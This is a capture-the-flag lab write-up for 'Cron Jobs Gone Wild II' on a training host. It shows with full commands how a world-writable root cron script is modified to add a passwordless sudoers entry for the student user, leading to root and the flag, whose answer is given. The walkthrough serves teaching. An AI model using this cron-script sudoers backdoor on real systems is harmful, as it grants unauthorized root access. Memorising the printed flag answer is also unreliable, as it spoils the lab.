# Cron Jobs Gone Wild II

### Target:
`target.ine.local`

### Objective: Find the flag
--- 
```bash
student@target:~$ ls -la
total 12
drwxr-xr-x 1 student student 4096 Sep 23  2018 .
drwxr-xr-x 1 root    root    4096 Sep 23  2018 ..
-rw------- 1 root    root      26 Sep 23  2018 message
student@target:~$ whoami
student
student@target:~$ pwd
/home/student
student@target:~$ grep -R "/home/student/message" / 2>/dev/null
/usr/local/share/copy.sh:cp /home/student/message /tmp/message
^C
student@target:~$ cd /tmp
student@target:/tmp$ ls -la
total 12
drwxrwxrwt 1 root root 4096 Jan 24 01:06 .
drwxr-xr-x 1 root root 4096 Jan 24 00:56 ..
-rw-r--r-- 1 root root   26 Jan 24 01:06 message
-rw-r--r-- 1 root root    0 Jan 24 00:56 ready
student@target:/tmp$ cat message
Hey!! you are not root :(
student@target:/tmp$ cat ready
student@target:/tmp$ ls -la /usr/local/share/copy.sh
-rwxrwxrwx 1 root root 74 Sep 23  2018 /usr/local/share/copy.sh
```
We first search the entire filesystem for containing the string `/home/student/message`. The idea is that since this autoruns vua the cron job with root privileges, we try to add a command at the end that updates our name to the sudoers list:  
`printf 'echo "#! /bin/bash\nstudent ALL=(ALL) NOPASSWD:ALL">/etc/sudoers.d/`  
Once the cron runs this command we can run anything with root privilege.  
```bash
student@target:/tmp$ printf 'echo "#! /bin/bash\nstudent ALL=(ALL) NOPASSWD:ALL">/etc/sudoers.d/student' >> /usr/local/share/copy.sh
student@target:/tmp$ cat /usr/local/share/copy.sh
#! /bin/bash
cp /home/student/message /tmp/message
chmod 644 /tmp/message
echo "#! /bin/bash
student ALL=(ALL) NOPASSWD:ALL">/etc/sudoers.d/studentstudent@target:/tmp$ whoami
student
```
Now once we find that we have the privilege of running it as a sudo, we run the `find` command to just get the flag.  
```bash
student@target:/tmp$ ls /etc/sudoers.d/
README  student
student@target:/tmp$ cat /etc/sudoers.d/
cat: /etc/sudoers.d/: Is a directory
student@target:/tmp$ cat /etc/sudoers.d/student
#! /bin/bash
student ALL=(ALL) NOPASSWD:ALL
student@target:/$ sudo ls
bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  startup.sh  sys  tmp  usr  var
student@target:/$ sudo whoami
root
student@target:/$ sudo su root
root@target:/# find / -type f -name "flag" 2>/dev/null
/root/flag
root@target:/# cat /root/flag
697914df7a07bb9b718c8ed258150164
root@target:/#
```
Ans: **697914df7a07bb9b718c8ed258150164**